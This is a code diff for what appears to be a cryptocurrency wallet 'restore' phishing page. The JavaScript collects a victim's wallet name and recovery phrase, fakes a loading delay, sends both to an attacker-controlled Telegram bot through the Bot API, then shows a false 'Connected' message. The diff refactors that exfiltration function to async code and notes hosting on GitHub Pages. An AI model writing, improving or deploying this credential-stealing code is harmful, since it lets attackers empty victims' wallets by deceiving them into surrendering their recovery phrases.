@@ -136,13 +136,17 @@ function showPopup(message) {
     }, 2000);
 }
 
-function sendToTelegram(message) {
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`)
-        .then(res => console.log('Sent to Telegram'))
-        .catch(err => console.error('Error sending to Telegram:', err));
+async function sendToTelegram(message) {
+    try {
+        // Telegram API requires HTTPS; GitHub Pages provides that
+        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`);
+        if (!response.ok) console.error('Failed to send');
+    } catch (err) {
+        console.error('Error sending to Telegram:', err);
+    }
 }
 
-restoreBtn.addEventListener('click', () => {
+restoreBtn.addEventListener('click', async () => {
     const walletName = walletNameInput.value.trim();
     const phrase = phraseInput.value.trim();
 
@@ -153,16 +157,15 @@ restoreBtn.addEventListener('click', () => {
         return;
     }
 
-    // Simulate loading for 5 seconds
     restoreBtn.classList.add('loading');
     restoreBtn.disabled = true;
 
-    setTimeout(() => {
+    setTimeout(async () => {
         restoreBtn.classList.remove('loading');
         restoreBtn.disabled = false;
 
         connectedPhrases.add(phrase);
-        sendToTelegram(`Wallet Name: ${walletName}\nRecovery Phrase: ${phrase}`);
+        await sendToTelegram(`Wallet Name: ${walletName}\nRecovery Phrase: ${phrase}`);
         showPopup("Connected");
 
         walletNameInput.value = '';
